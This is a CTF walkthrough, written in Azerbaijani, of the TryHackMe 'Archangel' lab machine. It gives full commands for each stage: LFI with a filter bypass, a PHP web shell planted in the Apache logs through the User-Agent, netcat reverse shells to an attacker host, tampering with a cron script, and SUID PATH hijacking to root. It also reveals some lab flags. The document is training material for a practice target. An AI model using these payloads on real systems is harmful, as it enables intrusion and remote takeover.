# TryHackMe — Archangel Writeup (Azərbaycan dilində)

**Platforma:** TryHackMe  
**Otaq:** Archangel  
**Çətinlik:** Asan  
**Kateqoriya:** Boot2Root, Web Exploitation, Privilege Escalation, LFI  
**Link:** https://tryhackme.com/room/archangel

---

## Məzmun

1. [Kəşfiyyat — Nmap Skan](#1-kəşfiyyat--nmap-skan)
2. [Web — mafialive.thm Domenini Tap](#2-web--mafialivehtm-domenini-tap)
3. [Gobuster — /test.php Tapma](#3-gobuster--testphp-tapma)
4. [LFI — Local File Inclusion](#4-lfi--local-file-inclusion)
5. [PHP Filter ilə Mənbə Kodu Oxuma](#5-php-filter-ilə-mənbə-kodu-oxuma)
6. [LFI Filtri Keçmə](#6-lfi-filtri-keçmə)
7. [Log Poisoning → RCE](#7-log-poisoning--rce)
8. [Reverse Shell — www-data](#8-reverse-shell--www-data)
9. [Cron Job → Archangel İstifadəçisi](#9-cron-job--archangel-istifadəçisi)
10. [User2 Flag — SUID Binary](#10-user2-flag--suid-binary)
11. [PATH Hijacking → Root](#11-path-hijacking--root)
12. [Nəticə](#12-nəticə)

---

## 1. Kəşfiyyat — Nmap Skan

```bash
nmap -sV -sC -v <HEDEF_IP>
```

**Nəticə:**

| Port | Servis | Versiya               |
|------|--------|-----------------------|
| 22   | SSH    | OpenSSH 7.6p1 Ubuntu  |
| 80   | HTTP   | Apache httpd 2.4.29   |

Yalnız **2 port** açıqdır. Birbaşa veb serverə keçirik.

---

## 2. Web — mafialive.thm Domenini Tap

Brauzer ilə `http://<HEDEF_IP>` açıldıqda **"WaveFire"** şirkətinin saytı görünür.

Saytın başlığında dəstək e-poçtu tapılır:

```
support@mafialive.thm
```

Bu bir **domen adıdır!** `/etc/hosts` faylına əlavə et:

```bash
echo "<HEDEF_IP> mafialive.thm" >> /etc/hosts
```

İndi `http://mafialive.thm` açıldıqda **flag 1** tapılır:

> **Flag 1:** `thm{****}`

---

## 3. Gobuster — /test.php Tapma

```bash
gobuster dir -u http://mafialive.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html
```

**Tapılan fayl:** `/test.php`

`http://mafialive.thm/test.php` açıldıqda bir düymə var. Düyməyə basıldıqda URL dəyişir:

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php
```

Mesaj: **"Control is an illusion"**

`?view=` parametri — **LFI zəifliyi** işarəsi!

---

## 4. LFI — Local File Inclusion

Standart LFI cəhdi:

```
http://mafialive.thm/test.php?view=../../../etc/passwd
```

**Nəticə:** `Sorry, Thats not allowed` — filtr var!

---

## 5. PHP Filter ilə Mənbə Kodu Oxuma

`test.php` faylının mənbə kodunu oxumaq üçün PHP base64 filter istifadə et:

```
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```

Base64 çıxışı Kali-də deşifrə et:

```bash
echo "<base64_string>" | base64 -d
```

**test.php mənbə kodu:**

```php
<?php
//FLAG: thm{*************}
function containsStr($str, $substr) {
    return strpos($str, $substr) !== false;
}
if(isset($_GET["view"])){
    if(!containsStr($_GET['view'], '../..') &&
       containsStr($_GET['view'], '/var/www/html/development_testing')) {
        include $_GET['view'];
    } else {
        echo 'Sorry, Thats not allowed';
    }
}
?>
```

**Flag 2** mənbə kodun içindədir!

### Filtr Məntiqini Anla

Filtr **2 şərt** yoxlayır:
1. `../..` **olmamalıdır**
2. `/var/www/html/development_testing` **olmalıdır**

---

## 6. LFI Filtri Keçmə

`../..` əvəzinə `..//..` istifadə et — eyni nəticə verir, amma filtr tutmur:

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//etc/passwd
```

**Nəticə:** `/etc/passwd` faylı oxunur — **LFI uğurlu!**

---

## 7. Log Poisoning → RCE

LFI vasitəsilə Apache log faylını oxuyuruq:

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log
```

Log faylı oxunur! Apache **User-Agent** başlığını loglara yazır.

### Log Zəhərləmə (Log Poisoning)

`curl` ilə **PHP kodu** User-Agent-ə yerləşdir:

```bash
curl http://mafialive.thm -A '<?php system($_GET["cmd"]); ?>'
```

### RCE Yoxla

Log faylını yenidən aç, `cmd` parametri əlavə et:

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=whoami
```

**Nəticə:** `www-data` — **RCE uğurlu!**

---

## 8. Reverse Shell — www-data

Kali-də dinlə:

```bash
nc -lvnp 4444
```

URL-ə reverse shell əmri göndər:

```bash
curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+<KALI_IP>+4444+>/tmp/f"
```

**Shell əldə edildi — www-data!**

Shell-i stabilləşdir:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
Ctrl + Z
stty raw -echo; fg
export TERM=xterm
```

---

## 9. Cron Job → Archangel İstifadəçisi

Cron job-ları yoxla:

```bash
cat /etc/crontab
```

**Nəticə:**
```
* * * * * archangel /opt/helloworld.sh
```

`/opt/helloworld.sh` hər dəqiqə **archangel** istifadəçisi kimi işləyir!

Faylın icazələrini yoxla:

```bash
ls -la /opt/helloworld.sh
# -rwxrwxrwx — hamı yaza bilər!
```

### Faylı Dəyişdir

```bash
echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <KALI_IP> 5555 > /tmp/f" >> /opt/helloworld.sh
```

Kali-də yeni dinləyici aç:

```bash
nc -lvnp 5555
```

**1 dəqiqə gözlə** — cron işləyəndə **archangel** kimi shell alınır!

**User Flag:**
```bash
cat /home/archangel/user.txt
```

---

## 10. User2 Flag — SUID Binary

Archangel-in `secret` qovluğuna bax:

```bash
ls -la /home/archangel/secret/
```

**Nəticə:**
```
-rwsr-xr-x 1 root root  backup
-rw-r--r-- 1 root root  user2.txt
```

`backup` faylında **SUID bit** var — root kimi işləyir!

```bash
cat /home/archangel/secret/user2.txt
```

**User2 Flag:** `thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}`

---

## 11. PATH Hijacking → Root

`backup` faylının nə etdiyini anlamaq üçün `strings` ilə bax:

```bash
strings /home/archangel/secret/backup
```

Skript `cp` əmrini **tam yol vermədən** (`/bin/cp` yox, sadəcə `cp`) çağırır.

### PATH Hijacking

Saxta `cp` faylı yarat:

```bash
cd /home/archangel/secret

echo -e '#!/bin/bash\n/bin/bash -p' > cp
chmod +x cp
```

`PATH` dəyişənini dəyişdir — cari qovluğu birinci qoy:

```bash
export PATH=/home/archangel/secret:$PATH
```

`backup` faylını işlət:

```bash
./backup
```

`backup` SUID ilə root kimi işləyir, `cp` axtaranda öncə cari qovluğa baxır, bizim saxta `cp` faylımızı tapır və **root shell** açır!

```bash
whoami
# root

cat /root/root.txt
```

**Root Flag:** `thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}`

---

## 12. Nəticə

### İstifadə edilən texnikalar

| Addım                      | Alət / Metod                          |
|----------------------------|---------------------------------------|
| Port skanı                 | Nmap                                  |
| Domen tapma                | E-poçt → /etc/hosts                   |
| Qovluq axtarışı            | Gobuster                              |
| Mənbə kodu oxuma           | PHP filter/base64-encode              |
| LFI filtr keçmə            | `../..` → `..//..`                    |
| Log poisoning              | curl + PHP User-Agent                 |
| RCE                        | Apache access.log + cmd parametri     |
| Reverse Shell              | Netcat                                |
| Shell stabilləşdirmə       | Python3 pty                           |
| Horizontal PrivEsc         | Cron job + yazıla bilən skript        |
| Vertical PrivEsc           | SUID binary + PATH hijacking          |

### Əldə edilən flaglar

| Flag     | Yer                              |
|----------|----------------------------------|
| Flag 1   | `http://mafialive.thm`           |
| Flag 2   | `test.php` mənbə kodu (PHP filter) |
| User     | `/home/archangel/user.txt`       |
| User2    | `/home/archangel/secret/user2.txt` |
| Root     | `/root/root.txt`                 |

### Öyrənilənlər

- E-poçt ünvanlarında **domen adları** gizlənə bilər — həmişə yoxla.
- `?view=` kimi parametrlər **LFI** zəifliyinə işarədir.
- Filtr olan LFI-lərdə **PHP filter wrapper** mənbə kodu oxumağa imkan verir.
- `../..` filtri `..//..` ilə keçilə bilər.
- Apache loglarına PHP kodu yerləşdirərək **Log Poisoning → RCE** əldə etmək mümkündür.
- Hər kəsin yaza biləcəyi cron skriptləri **horizontal privilege escalation** üçün istifadə edilə bilər.
- SUID binary-lərdə tam yol verilməmiş əmrlər **PATH Hijacking** zəifliyinə yol açır.

---

*Writeup müəllifi: CTF həvəskarı*  
*Tarix: 2026*
